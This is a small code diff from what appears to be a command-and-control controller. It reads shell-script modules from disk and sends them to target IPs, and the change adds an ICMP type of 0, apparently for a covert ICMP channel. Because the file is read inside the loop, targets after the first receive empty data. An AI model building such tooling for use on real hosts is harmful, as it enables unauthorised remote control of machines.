@@ -194,7 +194,7 @@ class Controller(Host):
         try:
             with open(f"./modules/{module}.sh","r") as f:
                 for target in targets:
-                    self.send(ip=target['ip'], command="module", data=f.read().encode(), target_id=target['id'])
+                    self.send(ip=target['ip'], command="module", data=f.read().encode(), target_id=target['id'], icmp_type=0)
                     print(f"Module sent to {target['ip']}")
         except FileNotFoundError:
             print("Module does not exist")
